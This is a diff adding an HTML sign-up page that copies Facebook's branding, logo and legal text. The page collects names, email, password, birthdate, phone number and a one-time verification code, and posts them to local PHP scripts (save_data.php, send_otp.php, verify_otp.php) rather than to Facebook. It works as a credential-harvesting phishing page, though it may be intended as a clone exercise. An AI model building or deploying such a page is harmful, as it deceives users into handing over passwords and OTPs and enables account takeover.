@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Facebook - Create a new account</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0;
+        }
+        .container {
+            padding: 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 450px;
+            text-align: center;
+            background-color: #fff;
+        }
+        h1 {
+            color: #1877f2;
+            font-size: 2.5em;
+            margin-bottom: 0;
+        }
+        .logo {
+            width: 42px;
+            margin-bottom: -5px;
+            margin-right: 10px;
+        }
+        form {
+            display: flex;
+            flex-direction: column;
+            align-items: stretch;
+        }
+        label {
+            text-align: left;
+            margin-top: 10px;
+        }
+        input[type="text"],
+        input[type="email"],
+        input[type="password"],
+        input[type="date"],
+        input[type="tel"] {
+            padding: 10px;
+            margin-top: 5px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            width: 100%;
+            box-sizing: border-box;
+        }
+        input[type="radio"] {
+            margin: 12px 5px 10px 0;
+        }
+        input[type="submit"], input[type="button"] {
+            background-color: #42b72a;
+            color: #fff;
+            padding: 10px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-top: 20px;
+            width: 30%;
+        }
+        input[type="submit"]:hover, input[type="button"]:hover {
+            background-color: #36a420;
+        }
+        p {
+            font-size: 12px;
+            color: #555;
+        }
+        a {
+            color: #1877f2;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+        .verification-box {
+            background-color: #f0f2f5;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            margin-top: 20px;
+            text-align: left;
+        }
+        .abc {
+            display: flex;
+            gap: 8px;
+        }
+        .error {
+            color: red;
+            font-size: 0.9em;
+            margin-top: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1><img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook logo" class="logo">facebook</h1>
+        <h2>Create a new account</h2>
+        <p>It's quick and easy.</p>
+        <form id="signupForm" method="POST" action="save_data.php">
+            <label for="firstname">First name:</label>
+            <input type="text" id="firstname" name="firstname" placeholder="Firstname" required><br>
+            <span id="firstnameError" class="error"></span>
+
+            <label for="lastname">Last name:</label>
+            <input type="text" id="lastname" name="lastname" placeholder="Lastname" required><br>
+            <span id="lastnameError" class="error"></span>
+
+            <label for="email">Email:</label>
+            <input type="email" id="email" name="email" placeholder="Email" required><br>
+            <span id="emailError" class="error"></span>
+
+            <label for="password">New password:</label>
+            <input type="password" id="password" name="password" placeholder="Password" required><br>
+            <span id="passwordError" class="error"></span>
+
+            <label for="birthdate">Date of birth:</label>
+            <input type="date" id="birthdate" name="birthdate" placeholder="Birthdate" required><br>
+            <span id="birthdateError" class="error"></span>
+
+            <label for="gender">Gender:</label><br>
+            <div class="abc">
+                <input type="radio" id="female" name="gender" value="Female" required>
+                <label for="female">Female</label>
+                <input type="radio" id="male" name="gender" value="Male" required>
+                <label for="male">Male</label>
+            </div>
+            <span id="genderError" class="error"></span>
+
+            <div class="verification-box">
+                <h3>Phone Number Verification</h3>
+                <label for="phone">Phone number:</label>
+                <input type="tel" id="phone" name="phone" placeholder="Enter your phone number" required><br>
+                <span id="phoneError" class="error"></span>
+                <input type="button" id="sendOtp" value="Send OTP"><br><br>
+                <label for="otp">Enter OTP:</label>
+                <input type="text" id="otp" name="otp" placeholder="Enter the OTP received"><br>
+                <span id="otpError" class="error"></span>
+                <input type="button" id="verifyOtp" value="Verify OTP">
+            </div>
+            <p>People who use our service may have uploaded your contact information to Facebook. <a href="#">Learn more</a></p>
+            <p>By clicking Sign Up, you agree to our <a href="#">Terms</a>, <a href="#">Privacy Policy</a> and <a href="#">Cookies Policy</a>. You may receive SMS notifications from us and can opt out at any time.</p>
+            <div class="button">
+                <input type="submit" value="Sign Up">
+            </div>
+        </form>
+    </div>
+    <script>
+        document.getElementById('sendOtp').addEventListener('click', function(event) {
+            event.preventDefault();
+            var phone = document.getElementById('phone').value;
+            if (phone) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'send_otp.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        alert(xhr.responseText);
+                    }
+                };
+                xhr.send('phone=' + encodeURIComponent(phone));
+            } else {
+                alert('Please enter your phone number.');
+            }
+        });
+    
+        document.getElementById('verifyOtp').addEventListener('click', function(event) {
+            event.preventDefault();
+            var otp = document.getElementById('otp').value;
+            if (otp) {
+                var xhr = new XMLHttpRequest();
+                xhr.open('POST', 'verify_otp.php', true);
+                xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+                xhr.onreadystatechange = function() {
+                    if (xhr.readyState === XMLHttpRequest.DONE) {
+                        alert(xhr.responseText);
+                    }
+                };
+                xhr.send('otp=' + encodeURIComponent(otp));
+            } else {
+                alert('Please enter the OTP.');
+            }
+        });
+    </script>
+    
+    
+</body>
+</html>
